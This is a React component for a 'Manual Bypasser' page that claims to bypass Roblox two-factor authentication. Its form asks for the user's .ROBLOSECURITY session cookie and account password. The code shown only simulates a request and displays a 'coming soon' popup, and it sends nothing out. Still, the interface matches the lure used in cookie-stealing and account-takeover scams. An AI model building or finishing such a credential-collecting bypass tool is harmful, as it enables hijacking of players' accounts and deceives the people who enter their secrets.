
import React, { useState } from 'react';
import { soundEngine } from '../utils/audio';

export const IpBypasser: React.FC = () => {
  const [cookie, setCookie] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  const handleBypass = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');
    soundEngine.playClick();

    if (!cookie.trim() || !password.trim()) {
      soundEngine.playArm(); // Warning sound
      setErrorMsg('Please enter both cookie and password');
      return;
    }

    setLoading(true);
    soundEngine.playEngage();

    // Simulate API call delay
    setTimeout(() => {
      setLoading(false);
      setShowPopup(true);
      soundEngine.playHover('cyan');
    }, 1500);
  };

  const handlePopupClose = () => {
    setShowPopup(false);
    setCookie('');
    setPassword('');
    soundEngine.playClick();
  };

  return (
    <div className="w-full max-w-4xl animate-fade-in-up relative">
      
      {/* Popup Overlay */}
      {showPopup && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
          <div className="bg-black border-[3px] border-white rounded-[24px] p-8 max-w-md w-full shadow-[0_0_40px_rgba(255,255,255,0.3)] animate-holographic relative overflow-hidden">
             
             {/* Background glow for popup */}
             <div className="absolute inset-0 bg-gradient-to-b from-[#0b0f1a] to-black -z-10"></div>
             
             <div className="text-center space-y-6">
                <div className="flex justify-center">
                   <div className="w-20 h-20 rounded-full bg-white/5 flex items-center justify-center border border-white/20">
                      <svg xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 text-white/80" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>
                   </div>
                </div>

                <div>
                  <h3 className="text-3xl font-black font-sans tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-white via-gray-300 to-white animate-pulse">
                     ⚠️ COMING SOON
                  </h3>
                  <p className="text-white/90 font-bold font-sans mt-2 text-xl tracking-tight">Manual Bypasser Tool</p>
                  <p className="text-white/70 text-sm mt-2 font-minimal leading-relaxed">
                    This feature is currently under development and will be available soon!
                  </p>
                </div>

                <div className="bg-white/5 border border-dashed border-white/20 rounded-xl p-4">
                   <p className="text-white/60 text-xs font-mono flex items-center justify-center gap-2">
                     <span className="animate-spin-slow">⏳</span> Estimated launch: Soon
                   </p>
                </div>

                <button 
                  onClick={handlePopupClose}
                  className="w-full py-3 bg-white text-black font-sans font-bold text-lg uppercase rounded-xl hover:bg-gray-200 transition-all shadow-lg active:scale-95 flex items-center justify-center gap-2 tracking-wide"
                >
                   <span>OK</span>
                </button>
             </div>
          </div>
        </div>
      )}

      <div className="relative bg-[#0b0f1a] bg-gradient-to-b from-[#0b0f1a] to-black border-2 border-white/20 rounded-[24px] p-6 md:p-10 shadow-[0_0_50px_rgba(255,255,255,0.05)] overflow-hidden">
        
        {/* Glow Animation */}
        <div className="absolute inset-0 shadow-[inset_0_0_80px_rgba(255,255,255,0.05)] rounded-[22px] pointer-events-none"></div>

        <div className="relative z-10 flex flex-col items-center text-center">
          
          <h1 className="text-4xl md:text-5xl font-black font-sans text-transparent bg-clip-text bg-gradient-to-r from-white via-gray-300 to-white animate-pulse mb-2 tracking-tighter drop-shadow-[0_0_15px_rgba(255,255,255,0.4)]">
            MANUAL BYPASSER
          </h1>
          
          <p className="text-white/60 mb-8 font-minimal text-sm tracking-widest uppercase">
            Bypass Roblox 2FA verification securely
          </p>

          <form onSubmit={handleBypass} className="w-full max-w-md space-y-5">
            
            {/* Cookie Input */}
            <div className="space-y-1 text-left">
              <label className="text-xs font-mono text-white/40 uppercase tracking-wider ml-1">Session Cookie</label>
              <input 
                type="text" 
                value={cookie}
                onChange={(e) => setCookie(e.target.value)}
                placeholder="Paste .ROBLOSECURITY cookie here"
                className="w-full bg-[#0a0c14] border border-white/10 rounded-xl px-5 py-4 text-white font-mono text-sm focus:outline-none focus:border-white/50 focus:shadow-[0_0_20px_rgba(255,255,255,0.2)] transition-all placeholder:text-white/20"
              />
            </div>

            {/* Password Input */}
            <div className="space-y-1 text-left relative">
              <label className="text-xs font-mono text-white/40 uppercase tracking-wider ml-1">Verification Password</label>
              <div className="relative">
                <input 
                    type={showPassword ? "text" : "password"} 
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Enter account password"
                    className="w-full bg-[#0a0c14] border border-white/10 rounded-xl px-5 py-4 text-white font-mono text-sm focus:outline-none focus:border-white/50 focus:shadow-[0_0_20px_rgba(255,255,255,0.2)] transition-all placeholder:text-white/20"
                />
                <button 
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-4 top-1/2 -translate-y-1/2 text-white/40 hover:text-white transition-colors"
                >
                    {showPassword ? (
                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
                    ) : (
                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                    )}
                </button>
              </div>
            </div>

            {errorMsg && (
              <div className="text-red-400 text-xs font-mono bg-red-500/10 border border-red-500/20 p-3 rounded-lg flex items-center justify-center gap-2">
                <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                {errorMsg}
              </div>
            )}

            <button 
              type="submit"
              disabled={loading}
              className="w-full bg-white text-black font-sans font-bold text-lg py-4 rounded-xl hover:bg-gray-100 hover:scale-[1.01] hover:shadow-[0_0_30px_rgba(255,255,255,0.2)] active:scale-[0.99] transition-all flex items-center justify-center gap-2 disabled:opacity-70 disabled:cursor-not-allowed uppercase tracking-wide"
            >
              {loading ? (
                 <>
                   <span className="w-5 h-5 border-2 border-black/30 border-t-black rounded-full animate-spin"></span>
                   <span>Processing...</span>
                 </>
              ) : (
                 <>
                   <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                   <span>BYPASS NOW</span>
                 </>
              )}
            </button>

          </form>

        </div>
      </div>
    </div>
  );
};
